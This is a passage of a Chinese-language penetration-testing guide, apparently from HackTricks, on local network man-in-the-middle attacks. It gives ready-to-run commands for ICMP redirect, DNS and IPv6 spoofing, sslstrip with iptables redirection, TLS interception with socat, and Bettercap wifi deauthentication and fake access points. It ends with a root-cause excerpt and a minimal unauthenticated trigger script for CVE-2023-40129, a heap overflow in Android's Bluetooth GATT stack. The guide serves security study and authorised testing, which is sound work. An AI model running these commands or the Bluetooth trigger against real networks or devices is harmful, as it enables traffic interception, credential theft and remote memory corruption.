ICMP Redirect 是通过发送一个 ICMP packet type 1 code 5，表明 attacker 是到达某个 IP 的最佳路径。然后，当 victim 想要联系该 IP 时，会通过 attacker 发送数据包。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

攻击者会解析受害者请求的部分（或全部）域名。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**使用 dnsmasq 配置自己的 DNS**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### 本地网关

系统和网络通常存在多条可达路径。在构建本地网络中 MAC addresses 列表后，使用 _gateway-finder.py_ 来识别支持 IPv4 转发的主机。

<details>
<summary>gateway-finder 使用示例</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

当 DNS 查询失败用于本地主机解析时，Microsoft 系统依赖 **Link-Local Multicast Name Resolution (LLMNR)** 和 **NetBIOS Name Service (NBT-NS)**。同样，**Apple Bonjour** 和 **Linux zero-configuration** 实现使用 **Multicast DNS (mDNS)** 来发现网络内的系统。由于这些协议没有身份验证且通过 **UDP** 广播消息运行，攻击者可以利用它们将用户重定向到恶意服务。

你可以使用 Responder 发送伪造响应，冒充主机查找的服务。\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

**浏览器通常使用 Web Proxy Auto-Discovery (WPAD) 协议来自动获取代理设置**。这涉及从服务器获取配置详细信息，通常通过像 "http://wpad.example.org/wpad.dat" 这样的 URL。客户端发现该服务器可以通过多种机制发生：

- 通过 **DHCP**，客户端利用特殊的 252 条目进行发现。
- 通过 **DNS**，在本地域内搜索名为 _wpad_ 的主机名。
- 通过 **Microsoft LLMNR and NBT-NS**，作为 DNS 查询失败时的回退机制。

工具 Responder 利用该协议充当 **malicious WPAD server**。它使用 DHCP、DNS、LLMNR 和 NBT-NS 误导客户端连接到它。要深入了解如何使用 Responder 冒充服务 [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

你可以在网络中提供不同的服务以尝试 **trick a user** 输入一些 **plain-text credentials**。**More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

该攻击与 ARP Spoofing 非常相似，但发生在 IPv6 环境中。你可以让 victim 认为 GW 的 IPv6 地址使用的是攻击者的 MAC。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

一些 OS 默认会根据网络中发送的 RA 包配置网关。要将攻击者声明为 IPv6 路由器，你可以使用：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

默认情况下，一些 OS 会尝试通过读取网络上的 DHCPv6 报文来配置 DNS。因此，攻击者可以发送伪造的 DHCPv6 报文，将自己配置为 DNS 服务器。DHCPv6 还会为受害者分配一个 IPv6 地址。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## 互联网攻击

### sslStrip

基本上，这种攻击的作用是：当**user**尝试**access**一个**HTTP**页面并被**redirecting**到**HTTPS**版本时，**sslStrip**会**maintain**一个**HTTP connection with** **client and**并建立一个**HTTPS connection with** **server**，因此它将能够以**plain text**方式**sniff**该连接。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
更多信息 [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy 用于绕过 HSTS

The **difference** between **sslStrip+ and dns2proxy** against **sslStrip** is that they will **redirect** for example _**www.facebook.com**_ **to** _**wwww.facebook.com**_ (note the **extra** "**w**") and will set the **address of this domain as the attacker IP**. This way, the **client** will **connect** to _**wwww.facebook.com**_ **(the attacker)** but behind the scenes **sslstrip+** will **maintain** the **real connection** via https with **www.facebook.com**.

该技术的**目的**是**绕过 HSTS**，因为 _**wwww**.facebook.com_ **不会**被保存到浏览器的**缓存**中，所以浏览器会被欺骗以在 **HTTP** 中执行 **facebook authentication**。\
注意，为了执行此攻击，受害者必须最初尝试访问 [http://www.faceook.com](http://www.faceook.com) 而不是 https。这可以通过修改 http 页面内的链接来实现。

更多信息 [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP 监听端口
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL 在端口监听

#### 生成密钥和自签名证书
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 使用证书监听
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 使用证书监听并重定向到 hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
有时，如果客户端检查 CA 是否有效，你可以 **serve a certificate of other hostname signed by a CA**。\
另一个有趣的测试，是为请求的主机名提供一个 c**ertificate of the requested hostname but self-signed**。

其他需要测试的情况包括尝试用一个虽然有效但不是有效 CA 的 certificate 来签名该 certificate。或者使用有效的 public key，强制使用像 diffie hellman（这种算法不需要用真实 private key 解密任何东西）这样的算法，当客户端请求对真实 private key 的 probe（比如 hash）时，发送一个伪造的 probe，并期望客户端不会对此进行检查。

## Bettercap

<details>
<summary>常见的 Bettercap 命令</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Active Discovery Notes

请注意，当向没有所请求端口的设备发送 UDP 包时，会收到一个 ICMP（Port Unreachable）响应。

### **ARP discover**

ARP 包用于发现网络中正在使用的 IP。PC 需要对每个可能的 IP 地址发送请求，只有正在使用的地址会响应。

### **mDNS (multicast DNS)**

Bettercap 发送 MDNS 请求（每 X ms）询问 **\_services\_.dns-sd.\_udp.local**，看到该包的机器通常会回答此请求。然后，它只查找对 "services" 有响应的机器。

**Tools**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap 向端口 137/UDP 广播数据包，询问名称 "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"。

### **SSDP (Simple Service Discovery Protocol)**

Bettercap 广播 SSDP 包以搜索各种服务（UDP 端口 1900）。

### **WSD (Web Service Discovery)**

Bettercap 广播 WSD 包以搜索服务（UDP 端口 3702）。


## Bluetooth (L2CAP/ATT/GATT) Attacks

- Android Fluoride exposes services over L2CAP PSMs (e.g., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Services register via:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue 框架支持基于 Scapy 的 L2CAP/ATT crafting（基于 BlueBorne l2cap_infra）。示例：
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): 在 Read Multiple Variable 响应构建器中发生 integer underflow，当 MTU 截断一个 variable-length 元素但未考虑 +2 length 字段时，可能导致约 ~64KB heap overflow。

<details>
<summary>根本原因 (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- 在可变长度条目中，overflow 路径仅减去 (total_len - mtu)，忽略 +2 length field，因此 len 发生下溢（例如 0xFFFE），memcpy 会写入缓冲区末端之外约 ~64KB。
</details>

- 最小的无需认证触发器（小 MTU 会在第 4 个属性上强制发生下溢）：
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### 电信 / 移动核心 (GTP) 利用


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## 参考资料

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
